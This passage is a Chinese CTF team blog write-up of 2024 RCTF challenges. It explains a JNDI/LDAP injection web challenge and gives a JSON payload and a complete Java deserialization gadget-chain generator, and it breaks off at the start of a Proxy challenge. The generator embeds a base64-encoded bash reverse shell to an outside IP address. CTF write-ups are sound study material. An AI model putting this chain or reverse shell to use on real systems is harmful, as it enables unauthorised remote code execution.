<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2024 RCTF SU WriteUp - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次RCTF我们 SU 取得了第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。 以下是我们 SU 本次 2024 RCTF的 writeup。"><meta property="og:type" content="blog"><meta property="og:title" content="2024 RCTF SU WriteUp"><meta property="og:url" content="https://team-su.github.io/posts/28185.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次RCTF我们 SU 取得了第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。 以下是我们 SU 本次 2024 RCTF的 writeup。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/46c26df9a8577c9cdf77aae4af49f1f1.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/09dbc0f7779d7896470f8ffc876d936d.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/1ae88573acbc157fb7bf1443a68dcb25.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/65e10ec43957abff3dbb183248e33bd3.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/421edc7a9ebe6cf69aa23245d5d0ea01.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/ffdea279dbcf5db7ff9c077e7124e3f5.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/511dc91db5ed3d0b02f1151d7a97bf92.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/54f66b7db91c9b25a2942b01953f7055.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/caefee5ee6854594b0e273f148ddbc46.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/a2d3802e41f4223abd0262e4f48937a0.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/88465060dc6397b6e62a5bfca4b1d89f.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/fb0da3743efd604bf45284812d2b5652.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/c55273600d978e3c1f63652ef1e8013e.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/c024ed1135e6e390d941dfa607010b77.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/a.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/b78bb6863e56b1c86be4bfd3feb0a5d5.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/b78bb6863e56b1c86be4bfd3feb0a5d5.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/cabab988fe4d41430594cfc3ae8c6511.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/7d652a7e19399a3c53683aa792a38bb7.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/c460eab80d6db0ff96dac59993a8ca9e.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/53f255d839ade35227ea9c02e782517b.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/c55273600d978e3c1f63652ef1e8013e.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/25cc211d6b16c26d5e69e44f5042a2fc.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/image-20240528103919-7oq843z.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104010-f8x2byk.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104020-d8i3qhc.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104029-f0db870.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104211-b4ois2b.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104218-n89rt30.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104237-t4btbiw.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104241-1htoamp.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/e929385cbdd238f4d6d62dcd12872cdb.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/e1b235340242f6fbb7d46a4c82e6432a.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/bbf3f404a640adef521efd8c4cdfc7ad.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/7da9e6da6a62dedcc190228819151942.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/fd3463bb362f4d232b2a7d0a4a2ce55b.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/06e323b3c9af628266176d7bb501f9cc.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/3e74199dbbf6e1890124459e4c20f885.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/3cd1bb2e6c5a427d115600c3f0d27f9f.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png"><meta property="og:image" content="https://team-su.github.io/images/2024-05-27-RCTF/968092825888ad31e980ebd3d5450648.png"><meta property="article:published_time" content="2024-05-27T15:15:34.000Z"><meta property="article:modified_time" content="2025-07-13T11:27:06.576Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="RCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2024-05-27-RCTF/46c26df9a8577c9cdf77aae4af49f1f1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/28185.html"},"headline":"2024 RCTF SU WriteUp","image":["https://team-su.github.io/images/2024-05-27-RCTF/46c26df9a8577c9cdf77aae4af49f1f1.png","https://team-su.github.io/images/2024-05-27-RCTF/09dbc0f7779d7896470f8ffc876d936d.png","https://team-su.github.io/images/2024-05-27-RCTF/1ae88573acbc157fb7bf1443a68dcb25.png","https://team-su.github.io/images/2024-05-27-RCTF/65e10ec43957abff3dbb183248e33bd3.png","https://team-su.github.io/images/2024-05-27-RCTF/421edc7a9ebe6cf69aa23245d5d0ea01.png","https://team-su.github.io/images/2024-05-27-RCTF/ffdea279dbcf5db7ff9c077e7124e3f5.png","https://team-su.github.io/images/2024-05-27-RCTF/511dc91db5ed3d0b02f1151d7a97bf92.png","https://team-su.github.io/images/2024-05-27-RCTF/54f66b7db91c9b25a2942b01953f7055.png","https://team-su.github.io/images/2024-05-27-RCTF/caefee5ee6854594b0e273f148ddbc46.png","https://team-su.github.io/images/2024-05-27-RCTF/a2d3802e41f4223abd0262e4f48937a0.png","https://team-su.github.io/images/2024-05-27-RCTF/88465060dc6397b6e62a5bfca4b1d89f.png","https://team-su.github.io/images/2024-05-27-RCTF/fb0da3743efd604bf45284812d2b5652.png","https://team-su.github.io/images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png","https://team-su.github.io/images/2024-05-27-RCTF/c55273600d978e3c1f63652ef1e8013e.png","https://team-su.github.io/images/2024-05-27-RCTF/c024ed1135e6e390d941dfa607010b77.png","https://team-su.github.io/images/2024-05-27-RCTF/a.png","https://team-su.github.io/images/2024-05-27-RCTF/b78bb6863e56b1c86be4bfd3feb0a5d5.png","https://team-su.github.io/images/2024-05-27-RCTF/b78bb6863e56b1c86be4bfd3feb0a5d5.png","https://team-su.github.io/images/2024-05-27-RCTF/cabab988fe4d41430594cfc3ae8c6511.png","https://team-su.github.io/images/2024-05-27-RCTF/7d652a7e19399a3c53683aa792a38bb7.png","https://team-su.github.io/images/2024-05-27-RCTF/c460eab80d6db0ff96dac59993a8ca9e.png","https://team-su.github.io/images/2024-05-27-RCTF/53f255d839ade35227ea9c02e782517b.png","https://team-su.github.io/images/2024-05-27-RCTF/c55273600d978e3c1f63652ef1e8013e.png","https://team-su.github.io/images/2024-05-27-RCTF/25cc211d6b16c26d5e69e44f5042a2fc.png","https://team-su.github.io/images/2024-05-27-RCTF/image-20240528103919-7oq843z.png","https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104010-f8x2byk.png","https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104020-d8i3qhc.png","https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104029-f0db870.png","https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104211-b4ois2b.png","https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104218-n89rt30.png","https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104237-t4btbiw.png","https://team-su.github.io/images/2024-05-27-RCTF/image-20240528104241-1htoamp.png","https://team-su.github.io/images/2024-05-27-RCTF/e929385cbdd238f4d6d62dcd12872cdb.png","https://team-su.github.io/images/2024-05-27-RCTF/e1b235340242f6fbb7d46a4c82e6432a.png","https://team-su.github.io/images/2024-05-27-RCTF/bbf3f404a640adef521efd8c4cdfc7ad.png","https://team-su.github.io/images/2024-05-27-RCTF/7da9e6da6a62dedcc190228819151942.png","https://team-su.github.io/images/2024-05-27-RCTF/fd3463bb362f4d232b2a7d0a4a2ce55b.png","https://team-su.github.io/images/2024-05-27-RCTF/06e323b3c9af628266176d7bb501f9cc.png","https://team-su.github.io/images/2024-05-27-RCTF/3e74199dbbf6e1890124459e4c20f885.png","https://team-su.github.io/images/2024-05-27-RCTF/3cd1bb2e6c5a427d115600c3f0d27f9f.png","https://team-su.github.io/images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png","https://team-su.github.io/images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png","https://team-su.github.io/images/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png","https://team-su.github.io/images/2024-05-27-RCTF/968092825888ad31e980ebd3d5450648.png"],"datePublished":"2024-05-27T15:15:34.000Z","dateModified":"2025-07-13T11:27:06.576Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次RCTF我们 SU 取得了第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。 以下是我们 SU 本次 2024 RCTF的 writeup。"}</script><link rel="canonical" href="https://team-su.github.io/posts/28185.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2024-05-27T15:15:34.000Z" title="2024/5/27 23:15:34">2024-05-27</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T11:27:06.576Z" title="2025/7/13 19:27:06">2025-07-13</time></span><span class="level-item">44 minutes read (About 6606 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2024 RCTF SU WriteUp</h1><div class="content"><p>本次RCTF我们 SU 取得了第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#x65;&#114;&#115;&#x5f;&#120;&#x63;&#116;&#x66;&#x40;&#x31;&#50;&#54;&#x2e;&#x63;&#111;&#x6d;">suers_xctf@126.com</a> 或者直接联系书鱼 QQ:381382770。</p>
<p>以下是我们 SU 本次 2024 RCTF的 writeup。</p>
<span id="more"></span>

<hr>
<p>本次RCTF我们 SU 取得了第二名🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#101;&#114;&#x73;&#95;&#120;&#x63;&#x74;&#x66;&#64;&#49;&#50;&#x36;&#x2e;&#x63;&#111;&#x6d;">suers_xctf@126.com</a> 或者直接联系书鱼 QQ:381382770。</p>
<p>以下是我们 SU 本次 2024 RCTF的 writeup。</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">web</a><ul>
<li><a href="#openyoureyestoseetheworld">OpenYourEyesToSeeTheWorld</a></li>
<li><a href="#proxy">Proxy</a></li>
<li><a href="#color-solved">color(Solved)</a></li>
<li><a href="#what-is-love-solved"><strong>what_is_love</strong> <strong>(Solved)</strong></a></li>
<li><a href="#nosandbox">nosandbox</a></li>
</ul>
</li>
<li><a href="#misc">misc</a><ul>
<li><a href="#logo-signin-solved">Logo: Signin (Solved)</a></li>
<li><a href="#s1ayth3sp1re-solved">s1ayth3sp1re (Solved)</a></li>
<li><a href="#sec-image-solved">sec-image （solved ）</a></li>
</ul>
</li>
<li><a href="#pwn">pwn</a><ul>
<li><a href="#taskgo-solved">Taskgo (Solved)</a></li>
<li><a href="#mine-solved">Mine (Solved)</a></li>
<li><a href="#dwebp-solved">Dwebp (Solved)</a></li>
</ul>
</li>
<li><a href="#reverse">reverse</a><ul>
<li><a href="#bloker-vm">bloker_vm</a></li>
<li><a href="#2048">2048</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#signsystem">SignSystem</a></li>
<li><a href="#hello-xctf">Hello, XCTF!</a></li>
<li><a href="#d3">D³</a></li>
<li><a href="#mersenne">Mersenne</a></li>
<li><a href="#l3">L³</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h1><span id="web">web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="openyoureyestoseetheworld">OpenYourEyesToSeeTheWorld</span><a href="#openyoureyestoseetheworld" class="header-anchor"></a></h2><p>根据题目源码易知是JNDI中的LDAP注入</p>
<p><img src="../images/2024-05-27-RCTF/46c26df9a8577c9cdf77aae4af49f1f1.png" alt="img"></p>
<p>查看容器中java版本，高版本一般都是打反序列化</p>
<p><img src="../images/2024-05-27-RCTF/09dbc0f7779d7896470f8ffc876d936d.png" alt="img"></p>
<p>依赖只有SpringBoot，那只剩下Jackson原生反序列化这条链子</p>
<p><img src="../images/2024-05-27-RCTF/1ae88573acbc157fb7bf1443a68dcb25.png" alt="img"></p>
<p>而如何触发obj.decodeObject()方法 和 绕过检测成了关键</p>
<p><img src="../images/2024-05-27-RCTF/65e10ec43957abff3dbb183248e33bd3.png" alt="img"></p>
<p><img src="../images/2024-05-27-RCTF/421edc7a9ebe6cf69aa23245d5d0ea01.png" alt="img"></p>
<p>绕过检测可以用Unicode编码绕过例如<code>\u003d</code> 替代 <code>=</code>等</p>
<p>obj.decodeObject()方法有三处调用</p>
<p><img src="../images/2024-05-27-RCTF/ffdea279dbcf5db7ff9c077e7124e3f5.png" alt="img"></p>
<p>c_lookup() 方法有5处调用</p>
<p><img src="../images/2024-05-27-RCTF/511dc91db5ed3d0b02f1151d7a97bf92.png" alt="img"></p>
<p>c_resolveIntermediate_nns() 方法有3处调用</p>
<p><img src="../images/2024-05-27-RCTF/54f66b7db91c9b25a2942b01953f7055.png" alt="img"></p>
<p>动调发现正常的payload 无法达到 c_resolveIntermediate_nns() 方法，因为tail 变量为空</p>
<p><img src="../images/2024-05-27-RCTF/caefee5ee6854594b0e273f148ddbc46.png" alt="img"></p>
<p>进入p_parseComponent() 方法，查看tail 属性的解析</p>
<p><img src="../images/2024-05-27-RCTF/a2d3802e41f4223abd0262e4f48937a0.png" alt="img"></p>
<p><img src="../images/2024-05-27-RCTF/88465060dc6397b6e62a5bfca4b1d89f.png" alt="img"></p>
<p>了解这些后，即可构造payload了</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;vps&gt;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;port&quot;</span><span class="punctuation">:</span><span class="number">9999</span><span class="punctuation">,</span><span class="attr">&quot;searchBase&quot;</span><span class="punctuation">:</span><span class="string">&quot;dc\u003djavasec,dc\u003deki,dc\u003dxyz\u002f0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;filter&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u0028cn\u003dtest\u0029&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>生成链子的脚本</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ctf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc0</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass0</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass0.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass0.removeMethod(writeReplace);</span><br><span class="line">        ctClass0.toClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMTk5LjM2LjE1OC85MDAyIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//利用 JdkDynamicAopProxy 进行封装使其稳定触发</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templatesImpl);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxyObj);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(barr.toByteArray());</span><br><span class="line">        System.out.println(res);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将生成好的链子放到HackerLDAPRefServer.java即可</p>
<p><img src="../images/2024-05-27-RCTF/fb0da3743efd604bf45284812d2b5652.png"></p>
<p>参考链接：</p>
<p><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload">https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E7%A8%B3%E5%AE%9A%E7%89%88payload</a></p>
<p><a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a></p>
<p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referenceldap%E6%94%BB%E5%87%BB">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JNDI/#jndi-referenceldap%E6%94%BB%E5%87%BB</a></p>
<p><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo</a></p>
<h2><span id="proxy">Proxy</span><a href="#proxy" class="header-anchor"></a></h2><p><code>Proxy.php</code>其中的<code>$_SERVER[&#39;SERVER_NAME&#39;].&#39;:&#39;.$_SERVER[&#39;SERVER_PORT&#39;];</code>可被伪造</p>
<p>导致可以控制其返回内容</p>
